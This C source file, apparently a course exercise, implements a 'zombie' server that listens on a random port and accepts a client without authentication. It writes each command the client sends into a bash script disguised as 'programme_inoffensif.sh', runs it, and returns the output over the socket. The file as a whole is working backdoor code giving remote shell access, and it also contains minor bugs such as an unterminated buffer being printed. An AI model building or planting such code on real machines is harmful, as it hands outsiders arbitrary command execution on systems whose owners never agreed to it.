#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "utils_v2.h"
#include "zombie.h"

#define BACKLOG 5

#define BUFFER_SZ 255
#define BASH "programme_inoffensif.sh"

void child(void *pipe, void *socket) {
  int *pipefd = pipe;
  int *socketfd = socket;

  // printf("%ls", socketfd);

  sclose(pipefd[1]);

  int fd = sopen(BASH, O_WRONLY | O_TRUNC | O_CREAT, 0700);

  char* shebang = "#!/bin/bash\n";
  swrite(fd, shebang, strlen(shebang));

  char bufferPipeRd[BUFFER_SZ];
  int nbCharRd = sread(pipefd[0], bufferPipeRd, BUFFER_SZ);

  swrite(fd, bufferPipeRd, nbCharRd);

  sclose(fd);

  dup2(*socketfd, STDOUT_FILENO);

  sexecl("./" BASH, BASH, NULL);

  sclose(pipefd[0]);
}

int main(int argc, char *arg[]) {
  // socket creation
  int sockfd = ssocket();

  int random = randomIntBetween(0, NBR_PORTS - 1);
  unsigned short PORT = PORT_TABLE[random];

  sbind(PORT, sockfd);
  slisten(sockfd, BACKLOG);
  printf("Le serveur tourne sur le port %d\n", PORT);

  // accept client connection
  int newsockfd = saccept(sockfd);
  printf("Client connected.\n");

  while (1) {
    // read messages from client
    char bufRd[BUFFER_SZ];
    int nbCharRd;
    do {
      nbCharRd = sread(newsockfd, bufRd, BUFFER_SZ);
      printf("Command received: %s\n", bufRd);

      int pipefd[2];
      spipe(pipefd);
      fork_and_run2(child, pipefd, &newsockfd);

      sclose(pipefd[0]);

      swrite(pipefd[1], bufRd, nbCharRd);

      sclose(pipefd[1]);
    } while (nbCharRd > 0);
  }

  // close connection to client
  sclose(newsockfd);
  printf("Client disconnected.\n");

  // close listen socket
  sclose(sockfd);
}
